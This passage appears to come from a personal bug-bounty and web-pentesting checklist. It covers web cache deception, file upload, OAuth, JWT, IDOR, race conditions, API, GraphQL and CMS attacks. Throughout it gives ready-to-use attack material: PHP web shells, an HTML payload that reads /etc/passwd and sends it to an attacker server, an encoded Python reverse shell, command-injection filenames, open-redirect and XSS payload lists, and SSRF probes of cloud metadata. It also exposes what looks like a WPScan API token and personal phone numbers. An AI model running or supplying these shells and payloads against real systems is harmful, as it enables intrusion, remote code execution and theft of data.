+            - [ ]  Check for cachable extension
+                - [ ]  `GET /profile/.js?cb=1`
+                - [ ]  `GET /profile/.css?cb=1`
+                - [ ]  `GET /profile/.png?cb=1`
+        - authenticated user put code in search
+            
+            ```jsx
+            &#34;&  and after that take the url and go private window and search in source code for your token or username
+            https://hackerone.com/reports/537564
+            ----------------------------------------
+            https://example.com/wp-json/v1/user$.[all_extensions] => fuzz $ with recollapse tool 
+            and fuzz allextensions with burpcollaborator as /v1/user/%23.pdf
+            ```
+            
+        - Senario
+            
+            attacker make pishing page with js file containing loop request for vulnerable site which make 100 request to https://www.vulnerable.com/profile/noexist.css once the user access pishing page 
+            
+            ```jsx
+            <html>
+            <head>
+            </head>
+            <body>
+            <script>
+                var cachedUrl = 'https://0a3d006404d6544382db01d000400072.web-security-academy.net/my-account' + generateId() + '.css';
+                const popup = window.open(cachedUrl);
+            
+                function generateId() {
+                    var content = '';
+                    const alphaWithNumber = 'QWERTZUIOPASDFGHJUKLYXCVBNM1234567890';
+            
+                    for (var i = 0; i < 10; i++) {
+                        content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))
+                    }
+                    return content;
+                }
+            
+                var checker = setInterval(function() {
+                    if (popup.closed) {
+                        clearInterval(checker);
+                    }
+                }, 200);
+                var closer = setInterval(function() {
+                    popup.close();
+                    document.body.innerHTML = 'Victims content is now cached <a href="' + cachedUrl + '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' + cachedUrl + '</b>'; 
+                    clearInterval(closer);
+                }, 3000);
+            
+            </script>
+            </body>
+            </html>
+            ```
+            
+    - Logic Flow
+        - Change the password ‘-alert(1)-’ and update then try to change password again but failed https://www.youtube.com/watch?v=yJK9NJMiDhk&ab_channel=i_eh_dreamer
+        - make payment and change params
+        - change quentity from 10 to -10 or cost from 10$ to -10$ or discount 10% to 100%
+        - post image and copy its url then remove it and go to path if ok then report it
+        - post comment , copy its url then remove it if ok then vulnerablity
+        - 
+    - CRLF
+        
+        ```json
+        crlf with xss with firewall bypass
+        [https://subDomain.microsoft.com/嘍嘊Set-Cookie:whoami=thecyberneh嘍嘊嘍嘊嘍嘊嘼script嘾alert(1);嘼/script嘾](https://subdomain.microsoft.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE)
+        ```
+        
+    - File upload
+        
+        ```json
+        ##1- save it as file.pdf and upload it
+        %PDF-1.7
+                1 0 obj
+                <</Pages 1 0 R /OpenAction 2 0 R>>
+                2 0 obj
+                <</S /JavaScript /JS (app.alert(1))
+                >> trailer <</Root 1 0 R>>
+        -------------------------------------------------
+        file.PHP or file.jpg.php 
+        <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
+        -------------------------------------------------
+        file.svg
+        <svg width="600" height="400" xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml">
+            <foreignObject width="100%" height="100%">
+                <body xmlns="http://www.w3.org/1999/xhtml">
+        <iframe src='javascript:confirm(10)'></iframe>
+                </body>
+            </foreignObject>
+        </svg>
+        ----------------------------------------------------
+        <svg width="600" height="400" xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml">
+          <script xlink:href="https://xss.report"/>
+          <script>
+          //<![CDATA[
+            alert("XSS");
+            ]]>
+            </script>
+          </svg>
+        ----------------------------------------------------
+        upload this html and if you need to convert to pdf use 
+        <html>
+            <body>
+                <b>Exfiltration via Blind SSRF</b>
+                <script>
+                var readfile = new XMLHttpRequest(); // Read the local file
+                var exfil = new XMLHttpRequest(); // Send the file to our server
+                readfile.open("GET","file:///etc/passwd", true); 
+                readfile.send();
+                readfile.onload = function() {
+                    if (readfile.readyState === 4) {
+                        var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
+                        exfil.open("GET", url, true);
+                        exfil.send();
+                    }
+                }
+                readfile.onerror = function(){document.write('<a>Oops!</a>');}
+                </script>
+             </body>
+        </html>
+        ----------------------------------------------------
+        to make reverse shell edit the server and port 
+        <html>
+            <body>
+                <b>Reverse Shell via Blind SSRF</b>
+                <script>
+                var http = new XMLHttpRequest();
+                http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
+                http.send();
+                http.onerror = function(){document.write('<a>Oops!</a>');}
+                </script>
+            </body>
+        </html>
+        
+        -----------------------------------------------------
+        file.php
+        <?php
+        $output = shell_exec($_GET["secert-cmd"]);
+        echo "<pre>$output</pre>";
+        ?>
+        ----------------------------------------------------
+        Attack Scenario
+        1- Create a php file and add php reverse shell to get RCE
+        2- rename the file to .py extension
+        3- upload our python extension file that has a php content inside 
+        4- Rename file extension from .py to .php
+        ----------------------------------------------------
+        delete account does not delete images inside 
+        1- upload image for your account 
+        2- open this image in new window 
+        3- delete your account 
+        4- go and reload this image if found (Vulnerablity)
+        ----------------------------------------------------
+        
+        # echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+        $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+        then ?file=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+        
+        ----------------------------------------------------
+        sleep(10)-- -.jpg
+        ; sleep 10;
+        file';select+sleep(5);--.jpg
+        file$(whoami).jpg
+        file`whoami`.jpg
+        file.jpg||whoami
+        passwd%00.png
+        file.ph\p => to bypass 
+        file.php%20.jpg
+        file.php%0a.jpg
+        shell.php%00.jpg
+        file.php%0d0a.jpg
+        file.php/.jpg
+        file.php.\.jpg
+        file.php..jpg
+        file.php….jpg
+        file.php:.jpg
+        ../../etc/passwd/logo.png 
+        ../../../tmp/lol.png 
+        /etc/passwd?.csv
+        https://burpcollab.com  => filename => ssrf
+        <script>alert(1)</script>.txt
+        'cv.pdf<img src=x onerror=c-onfirm(1)'>  => when filename printed inside the code
+        "><svg onload = alert(document.cookie)>.docx
+        
+        ------------------------
+        gif => filename=file.php => Content-Type: image/jpg
+        GIF8
+        <?php system($REQUEST['cmd']);?>
+        ------------------------
+        trying to upload aspx random.aspx;.jpg  or random.png.aspx
+        https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/ASP/cmd.aspx#js-repo-pjax-container
+        ----------------------------
+        Content-Disposition: form-data; name="file"; filename="58832_300x300.jpg<svg
+        onload=confirm()>"
+        Content-Type: image/jpeg
+        ----------------------------
+        Content-Disposition: form-data; name="imageupload"; filename="zseano."
+        Content-Type: text/html
+        ------WebKitFormBoundaryAxbOlwnrQnLjU1j9
+        Content-Disposition: form-data; name="imageupload"; filename=".html"
+        Content-Type: image/png
+        <html>HTML code!</html>
+        ----------------------------
+        Content-Disposition: form-data; name="oauth_application[logo_image_file]";
+        filename="testing1.html"
+        Content-Type: text/html
+        ‰PNG
+        <script>alert(0)</script>
+        ```
+        
+        - DOS attack via file upload https://hackerone.com/reports/390
+        - Dos attack via file name ⇒ long file name https://hackerone.com/reports/764434
+        - crossdomain.xml
+        - ...:.jpg  ⇒ can’t be easily deleted
+        - .jsp
+        - check put method is enabled if yes then
+        - `curl --upload-file <file name> -v --url <target ip> -0 --http1.0`
+        - Xss via svg
+            
+            ```jsx
+            <?xml version=”1.0" standalone=”no”?>
+            <!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN” “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+            
+            <svg version=”1.1" baseProfile=”full” xmlns=”http://www.w3.org/2000/svg">
+            <polygon id=”triangle” points=”0,0.0,50.50,0" fill=”#009900" stroke=”#004400"/>
+            <script type=”text/javascript”>
+            prompt(‘XSS-Attack’);
+            prompt(document.domain);
+            prompt(document.cookie);
+            prompt(alert(localStorage.getItem(“IsvSessionToken”)));
+            </script>
+            </svg>
+            ```
+            
+        
+- **Dom-Invader**
+    
+    [https://portswigger-](https://portswigger-labs.net/dom-invader/)labs.net/dom-invader
+    
+- **check 0-auth**
+    - CSRF via 0-auth to tie victim to your google account lead to account takeover https://shellmates.medium.com/oauth-2-0-authentication-misconfiguration-dcb811062f1d
+        
+        make CSRF poc once victim go into it your (hacker) gmail will be tied to his account immediately if state= is not found
+        
+    - https://web.archive.org/web/20210607123429/https://www.binarybrotherhood.io/oauth2_threat_model.html
+    - Open redirect via 0-auth
+        
+        after tying gmail account to your account intercept request and take url and change redirect_uri then send it to victim 
+        
+        ```powershell
+        https://hacker.com#victim.com
+        https://victim.com.hacker.com
+        https://victim.com@hacker.com
+        
+        https://hacker.com?@victim.com
+        https://hacker.com\@victim.com
+        
+        https://hacker.com?a=https://victim.com
+        \/yoururl.com
+        \/\/yoururl.com
+        \\yoururl.com
+        //yoururl.com
+        //theirsite@yoursite.com
+        /\/yoursite.com
+        https://yoursite.com%3F.theirsite.com/
+        https://yoursite.com%2523.theirsite.com/
+        https://yoursite?c=.theirsite.com/ (use # \ also)
+        //%2F/yoursite.com
+        ////yoursite.com
+        https://theirsite.computer/
+        https://theirsite.com.mysite.com
+        /%0D/yoursite.com (Also try %09, %00, %0a, %07)
+        /%2F/yoururl.com
+        /%5Cyoururl.com
+        //google%E3%80%82com
+        
+        ```
+        
+    - **OAuth2 access_token is leaked through referrer header**
+        
+        https://hackerone.com/reports/835437
+        
+        https://hackerone.com/reports/787160
+        
+        https://hackerone.com/reports/202781
+        
+    - **OAuth2 login bypass due to lack of access_token validation**
+        
+        https://hackerone.com/reports/245408
+        
+- **Crack JWT**
+    
+    [document.pdf](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/a95e2b2d-ccaa-4dd1-bc25-5f849a93c304/document.pdf)
+    
+    use chatgpt and tell him : Decode the base64, Explain it , and modify the jwt to generate 3 different versions to test various vulnerabilities: JWT_HERE 
+    
+    - JWT Misconfigurations
+        - [ ]  JWT Not being Checked
+        - [ ]  JWT none Algorithm Attack
+        - [ ]  Brute Force JWT Secret
+        - [ ]  Self Signed JWT via JWK Parameter
+        - [ ]  Self Signed JWT via JKU Parameter
+        - [ ]  Self Signed JWT via kid Parameter
+        - [ ]  SQL Injection via kid Parameter
+        - [ ]  Algorithm Confusion
+        
+        ```powershell
+        {
+        "alg":"HS256",
+        "typ":"JWT",
+        "kid": "../../../../../../dev/null"
+        }
+        ```
+        
+- **Session**
+    - **Improper Access Control lead to Session Hijacking**
+        
+        go to change the email address and intercept request send it to repeater and logout and send request of repeater to see if email changes or not if yes then (bug) after logout
+        
+- **IDOR and Business Logic**
+    
+    Use autorize burp extension
+    
+    - **Invite**
+        
+        ```json
+        1- deleted user can make actions like modify posts , add new users , delete another users 
+        2- user can esclate himself to admin 
+        3- normal user can make admin actions
+        4- if can't downgrade owner to user you can add new user and put owner as new user and observe you downgraded him successfully
+        -------------------------------
+        abusing vicitm with unexpired invitation
+        1- user1 invites user2 to his list
+        2- before user2 accept the invitation user1 delete the list 
+        3- observe the link is still valid 
+        4- user2 accepts the invitation and found `no such list `
+        5- user2 tries to delete the list and foudn `can't delete the list or can't leave the list`
+        -------------------------------
+        Non working Feature - Cancel email verfication not working lead to account takeover
+        1- try to change email address 
+        2- you mistoke the email and this happens alot 
+        3- you try to cancel email changing and verification and it's not working 
+        4- the man reached email can takeover the account directly
+        5- also if cancel applyed try to reset the password by this email and see
+        --------------------------------
+        Bypass invitation limit by race condition
+        1- if the limit is 2 invites send the request to turbo intruder 
+        2- choose race-single-packet-attack.py and put %s in the place and run obsrve you bypassed the limit
+        --------------------------------
+        Bypass invitation limit by using the same cookies
+        1- for ex: limit is 2 
+        2- invite the 2 users 
+        3- go to repeater and change one of the emails to the 3th user and observe success
+        ---------------------------------
+        Improper Revoking Collaborator Access  
+        1- userA add userB As Collaborator 
+        2- UserA remove UserB 
+        3- UserB doesn't reload the page and make some actions and observe it is still valid 
+        4- UserB add UserC as backdoor with admin permissions 
+        ---------------------------------
+        Changing email in backend even it's not allowed in frontend
+        1- when trying to change the email address found that it is not allowed 
+        2- but when you update info and intercept request observe email is found 
+        3- change it and send and observe it changed successfully
+        --------------------------------
+        Follow user multiple times by race condition
+        1- try to follow user and intercept the request send it to intruder 
+        2- add fake Header Test: %s
+        3- observe you followed him mutliple times
+        --------------------------------
+        Bypass file extension while upload 
+        1- try to upload file and observe it allows only txt file for example
+        2- then create file.txt and rename it to file.php for example and observe you bypassed the feature
+        3- try to execute the file to RCE
+        --------------------------------
+        Pre-Account takeover due to 0auth without verifying the new email
+        Pre-Account Takeover due to enabling 2fa without email verification
+        Pre-Account takeover due to 0auth without verfiying the new changed email address as
+        - attacker make new account with his email address 
+        - verify his email and change it to user and don't verify it 
+        - then link his account to Google or Facebook 0auth 
+        - victim would create account and then attacker can takeover it easily
+        ---------------------------------
+        Delete comments due to reports on them (Race Conditioning)
+        1- found that comments can be deleted due to 10 reports 
+        2- send request to turbo intruder and delete any comments by race condtion
+        ---------------------------------
+        Broken Access Control 
+        1- Add userA as admin
+        2- after completing invitation downgrade him to normal user
+        3- go to endpoint that admin only can access and observe you are still admin although it disappeared
+        ---------------------------------
+        IDOR user can follow himself
+        1- follow someone and intercept the request change the id to your id
+        2- when watching the profile you will find it increased one
+        ----------------------------------
+        if there is IDOR while changing the password or email then try to chain no rate limit on current password
+        -----------------------------------
+        make unlimited number of posts
+        -----------------------------------
+        when updating info found that the same url for all users then could be IDOR lead to account takeover
+        -----------------------------------
+        Broken Authentication as api is still used after deleting user
+        1- admin invites userA to join the team
+        2- userA makes api to access team resources 
+        3- admin delete user 
+        4- user's api is still valid and can delete and modify the team
+        ------------------------------------
+        Broken Access Control makes attacker user to execute admin commands
+        1- login with admin and user 
+        2- in admin side try to delete anything 
+        3- replace the access token of admin by user 
+        4- if action is ok then vulnerability 
+        ```
+        
+    
+    remove header Authorization: Bearer xxxxxxxxxxxxxxx and see if another header is identifier
+    
+    change request method and try 
+    
+    ```json
+    IDOR 
+    1- upload image for account profile 
+    2- delete the image and intercept request 
+    3- put the link of background image related to site  and you have deleted the image of site without admin access
+    -----------------------------------------------
+    IDOR unsubscript any email
+    
+    --------------------
+    
+    Cookie: user_id=12
+    GET /myprofile/123 HTTP/1.1 => get profile info
+    while update email address see if there is id in payload or header
+    /me/orders => /user/123/orders => /users/123/orders
+    /api/logout/123 => idor logout any account
+    /api/v1/users/1 => /api/users/* => /api/users/% => /api/users/_ => /api/users/.
+    /api/user/1 => /api/root/1 => /api/su/1 => /api/admin/1 => /api/administrator/1
+    1- know your id , username , password of two accounts and exchange 
+    api/user/a8ae-1322-ac09-8f90
+    /api/user/1
+    /api/user/user@company.com
+    when finding paramter as route look https://github.com/concourse/concourse/security/advisories/GHSA-5jp2-vwrj-99rf
+    ```
+    
+- **Roles**
+    
+    ```json
+    1- if admin can't edit owner   => [video](https://www.youtube.com/watch?v=iQYVFBF0qGo&ab_channel=KaremElsqary) 
+    2- try to add new user but with user permissions and put email of admin in it and see if you can downgrade the owner to user or not
+    ---------------------------------
+    1-
+    
+    ```
+    
+- **Race Condition**
+    
+    ```json
+    ### race condition
+    1- send request to  turbo intruder and use Race.py script 
+    2- set User-Agetn: %s     
+    3- start attack => likes , comments ...
+    -------------------------------------
+    ##0
+    1- send money and make race conditions to send more than what you have
+    --------------------------------------
+    ##1
+    1- bypass limit of invitions by race conditions
+    ---------------------------------------
+    ##2
+    use discount coupon many times by race condtions
+    ---------------------------------------
+    ##3 race condition on sending sms otp 
+    1- try to send otp to your number 01003425890
+    2- try to send otp to victim numer 01205958128
+    and make race condition in two requests at the same time that can send the same code
+    ----------------------------------------
+    make race condition on sending reset password token to two emails 
+    1- reset the password for your email 
+    2- intercept the request and make another request to another email
+    3- make race condition between them  or put them in repeater group 
+    4- send the requests and check if tokens are the same 
+    
+    ```
+    
+    if you can only invite 5 people then invite 4 and go to inspection > network > copy request as cURL then take request and put it into terminal repeat it many times separated by & as
+    
+    curl [google.com](http://google.com)  -payload coupon1 & curl google.com -payload coupon2  & curl google.com -payload coupon3
+    
+- **api**
+    
+    gather all api subdomains and use kiterunner 
+    
+    katana -mdc ‘contains(endpoint,”api”)’ -jc -u https://eample.com
+    
+    cat httpx| waybackurls | grep api
+    
+    ```jsx
+    RapidApi => for testing api 
+    fuzz apis parameters via : git clone https://github.com/PandaSt0rm/webfuzz_api.git
+    # python3 api_fuzzer.py http://IP:PORT | grep -v 404
+    
+    to send the routes found to burpsuite
+    kr kb replay -w /routes-large.kite --proxy=http://127.0.0.1:8080 http://example.com
+    https://github.com/hAPI-hacker/Hacking-APIs
+    /api/users 
+    /api/admin/users
+     api/users/listing?limit=20&page=1
+    /api/v1/user?find=[name]
+    {"roles":["_admin"]} => or {"roles":["_admin"],"roles":[]}
+    {"email": "test@test.com"}
+    {"email": true}
+    {"email": 1}
+    {"email": -1}
+    {"email": ["test@test.com", true]}
+    {"email": {"admin": true}}
+    {
+    "username":"admin",
+    "password":"' OR 1=0--"
+    }-=> if recived any error then it it's sql injection
+    
+    // Prototype Pollution
+    {"email": "test@test.com", "__proto__": {"admin": true}}
+    {"email": {"__proto__": {"admin": true}}}
+    sqlmap -u http://vulnerable.com/api/v2/fetch/?post=1 --dump --batch
+    
+    ### rce in node.js
+    /api/?key=process.cwd()
+    
+    ##if site show response in xml then try XXE 
+    GET /api/product/1?xml HTTP/1.1
+    ------------------------------------
+    {
+    "alg":"HS256",
+    "typ":"JWT",
+    "kid": "../../../../../../dev/null"
+    }
+    --------------------------------------
+    https://rapidapi.com
+    https://apis.guru/browse-apis
+    --------------------------------------
+    sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz
+    $ sudo tar -xvzf postman-linux-x64.tar.gz -C /opt
+    $ sudo ln -s /opt/Postman/Postman /usr/bin/postman
+    
+    /api/v1/config
+    /api/v2/config  => unauthorized config file 
+    
+    when found https://company.com/api/users/:id
+    ffuf -c -w <(seq 1 1337) -u https://company.com/api/users/FUZZ
+    
+    ```
+    
+    - if found google api test it on https://github.com/streaak/keyhacks
+- **Swagger-Ui**
+    
+    ```jsx
+    https://github.com/BishopFox/sj
+    to test the paths and idors
+    1- try to put token to test endpoints 
+    2- if not found then try to create account in another subdomains 
+    3- take authorization token and put it in swagger-ui 
+    4- access internal information and admin endpoints 
+    ```
+    
+- **GraphQl**
+    
+    ```json
+    put * in the value of variables in graphql then put request in req.txt and use sqlmap
+    sqlmap -r req.txt --dbs
+    ----------------------------------
+    try 
+    {
+    "query":"{__schema{types{names,fields{name}}}}"
+    }
+    if forbidden then try comman , 
+    {
+     "query": "{__schema,{types{names,fields{name}}}}"
+    }
+    
+    then try :
+    {"query":"{__schema{queryType{name,fields{name,args{name}}}}}"
+    }
+    ------------------------------------------
+    first need to fingerprint the graphql server with graphw00f 
+    python3 main.py -d -f -t http://172.17.0.2
+    after identifing  the server go to https://github.com/nicholasaleks/graphql-threat-matrix 
+    --------------------------------------------
+    first you need to identify the objects 
+    {"query":"{__schema {types {name}}}"}
+    ----------------
+    after that you need more infomation about specific object 
+    {
+      __type(name: "UserObject") {
+        name
+        fields {
+          name
+          type {
+            name
+            kind
+          }
+        }
+      }
+    }
+    -------------------------------------------
+    to obtain all supported queries in backend by 
+    {
+      __schema {
+        queryType {
+          fields {
+            name
+            description
+          }
+        }
+      }
+    }
+    --------------------------------------------
+    general introspecation to dumpt all data 
+    query IntrospectionQuery {
+          __schema {
+            queryType { name }
+            mutationType { name }
+            subscriptionType { name }
+            types {
+              ...FullType
+            }
+            directives {
+              name
+              description
+              
+              locations
+              args {
+                ...InputValue
+              }
+            }
+          }
+        }
+    
+        fragment FullType on __Type {
+          kind
+          name
+          description
+          
+          fields(includeDeprecated: true) {
+            name
+            description
+            args {
+              ...InputValue
+            }
+            type {
+              ...TypeRef
+            }
+            isDeprecated
+            deprecationReason
+          }
+          inputFields {
+            ...InputValue
+          }
+          interfaces {
+            ...TypeRef
+          }
+          enumValues(includeDeprecated: true) {
+            name
+            description
+            isDeprecated
+            deprecationReason
+          }
+          possibleTypes {
+            ...TypeRef
+          }
+        }
+    
+        fragment InputValue on __InputValue {
+          name
+          description
+          type { ...TypeRef }
+          defaultValue
+        }
+    
+        fragment TypeRef on __Type {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+                ofType {
+                  kind
+                  name
+                  ofType {
+                    kind
+                    name
+                    ofType {
+                      kind
+                      name
+                      ofType {
+                        kind
+                        name
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+    -------------------------------------------
+    get the result of the above introspection and put it inside https://graphql-kit.com/graphql-voyager/
+    click on CHANGE SCHEMA then click on INTROSPECTION and paste the result of above query
+    and click on DISPLAY 
+    
+    ------------------------------------
+    https://graphql-kit.com/graphql-voyager/
+    https://github.com/dolevf/graphw00f
+    https://github.com/nicholasaleks/graphql-threat-matrix
+    
+    if website has /graphql 
+    query{
+    function_here
+    }
+    
+    ```
+    
+- **check technology**
+    
+    https://github.com/intigriti/misconfig-mapper
+    
+    - wordpress
+        - wpscan
+            
+            ```jsx
+            wpscan --url [https://target.com](https://target.com/) --disable-tls-checks --api-token zBsi404GGCMKGzTraiEsSsQsFXCsUVWmaDUsn3EPuKc -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+            wordpress usernames exposure :
+            /wp-json/wp/v2/users
+            /wp-json/?rest_route=/wp/v2/users/
+            /wp-json/?rest_route=/wp/v2/users/n
+            /index.php?rest_route=/wp-json/wp/v2/users
+            /index.php?rest_route=/wp/v2/users
+            /author-sitemap.xml
+            /wp-content/debug.log
+            /wp-content/plugins/mail-masta/
+            /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+             /wp-content/uploads/wp-file-manager-pro/fm_backup/
+            *-----------------------*	
+            /wp-login.php?action=register
+            /wp-admin/login.php
+            /wp-admin/wp-login.php
+            /login.php
+            /wp-login.php
+            /wp-config.php
+            /wp-config.php_
+            /wp-config.php.BAK
+            /tox.ini 
+            https://hackerone.com/reports/1784999 
+            
+            /wp-content/uploads/  => try change method to put 
+            /wp-content/UPLOADS/
+            /wp-content/UpLoAds/
+            -----------
+            wordpress 4.7.1
+            /wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php.
+            ------------
+              ( password fuzzing via xmlrpc)
+            wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com 
+             Wordpress-Roles => 
+            Administrator => can manage all posts delete and add
+            Author => can publish his own posts
+            Editor =>  can publish and manage others posts 
+            Contributor => manage their own posts without publish
+            Subscriber => normal user browse posts
+            
+            /wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd
+            /wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&
+            /wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd
+            /wp-content/plugins/anti-plagiarism/js.php?m=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+            /wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
+            /wp-content/plugins/dzs-videogallery/admin/upload.php
+            /wp-content/plugins/e-search/tmpl/title_az.php?title_az=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+            /wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
+            /wp-content/plugins/hd-webplayer/playlist.php
+            /wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
+            -------------------------
+            POST /wp-json/wp/v2/users
+            Authorization Bearer <search_for_authorization_in_javascript_files>
+            
+            {
+             "username": "hossamshady",
+             "email" : "hh5645621@gmail.com",
+             "password":"this is pass",
+             "roles":["administrator"] 
+            }
+            	
+            ```
+            
+        - check xmlrpc.php ⇒ ssrf
+            
+            ```jsx
+            Wrap lines Copy Download
+            <?xml version="1.0"?>
+            <methodCall>
+            <methodName>wp.getOptions</methodName>
+            <params>
+            	<param><value>zzz</value></param>
+                    <param><value>admin@example.com</value></param>
+                    <param><value>@@@nopass@@@</value></param>
+            </params>
+            </methodCall>
+            ```
+            
+        - check sql injection via login
+            
+            ```jsx
+            ‘ OR 1=1;- -
+            ```
+            
+        - fuzz endpoints with wordpress wordlist for files
+        - use metasploit to scan and exploit wordpress
+            
+            
+        - check http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+        - CVE-2021-24364	==> xss via wordpress before 5.4.4
+            
+            ```jsx
+            [site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options={'location'%3A'Cairo'%2C'units'%3A'C'%2C'forecast_days'%3A'5<%2Fscript><script>alert(document.domain)<%2Fscript>custom_name'%3A'Cairo'%2C'animated'%3A'true'}](http://site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D)
+            ```
+            
+    - joomla
+        
+        ```jsx
+        sudo pip3 install droopescan
+        droopescan scan joomla --url http://dev.inlanefreight.local/
+        sudo python2.7 -m pip install urllib3 certifi bs4
+        python2.7 joomlascan.py -u http://dev.inlanefreight.local
+        ```
+        
+    - Drupal
+        
+        ```jsx
+        
+        droopescan scan drupal -u http://drupal.inlanefreight.local
+        python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+        fuzz https://example.com/node/$1$ => fuzz 1 to 1000 found hidden files
+        /jsonapi/user/user
+        https://www.exploit-db.com/exploits/44448
+        https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/
+        /core/install.php
+        
+        ```
+        
+    - tomcat
+        
+        ```powershell
+        search for /manager and default credentials for tomcat : => username=tomcat and password=s3cret
+        /sdp/struts/webconsole.html?debug=console
+        ```
+        
+    - AEM
+        
+        ```json
+        inurl:/content/dam/
+        inurl:/content/geometrixx/
+        inurl:/etc.clientlibs
+        inurl: /libs/cq/security/userinfo.json
+        python aem_hacker.py -u <URL Here> --host <Your Public IP>
+        fuzz wordlist https://github.com/clarkvoss/AEM-List/blob/main/paths?fbclid=IwAR1ifs59vpWJGDLkrNaEeWPx7LtH-e2BkZrKhA_IXVntlR1xBiR2G1PwVi0&source=post_page-----416763d3ad04--------------------------------
+        https://github.com/0ang3el/aem-hacker
+        try fuzz manually and bypass dispatcher 
+        ‘ /bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1’
+        ```
+        
+        ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/079450e7-156d-4b36-b3c7-5b6eb648bc23/Untitled.webp)
+        
+    - Elastic
+        
+         /_cat/indices?v 
+        
+        /_stats/?pretty=1
+        
+        /_all/_search?q=email
+        
+    - jira
+        
+        ```json
+        git clone https://github.com/MayankPandey01/Jira-Lens 
+        cd Jira-Lens
+        sudo python3 -m pip install -r requirements.txt
+        cd Jira-Lens
+        python3 Jira-Lens.py -u ejemploweb.com
+        ----------------------------
+        /secure/ManageFilters.jspa?filter=popular&filterView=popular
+        /secure/Dashboard.jspa   => Project Key enumeration =>  CVE 2020 14178  
+        /secure/QueryComponent!Default.jspa   => CVE-2020-14179
+        /secure/Dashboard.jspa/secure/QueryComponent!Default.jspa  CVE-2020-14179
+        /secure/ViewUserHover.jspa?username=<uname> => CVE-2020-14181 username enumeration
+        /secure/popups/UserPickerBroswer.jspa
+        /ConfigurePortalPages!default.jspa?view=popular
+        /secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
+        /secure/popups/UserPickerBrowser.jspa
+        /jira/servicedesk/customer/user/signup
+        /servicedesk/customer/user/signup
+        inurl:/ManageFilters.jspa?filterView=popular AND ( intext:All users OR intext:Shared with the public OR intext:Public )
+        ------------------------
+        POST /plugins/servlet/gadgets/makeRequest
+        ..
+        url=https://burpcollab.net
+        -------------------------
+        plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/local-hostname/
+        plugins/servlet/oauth/users/icon-uri/consumerUri=http://[::]
+        -------------------------
+        /wiki/label/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm => CVE-2018-5230
+        /pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
+        -------------------------
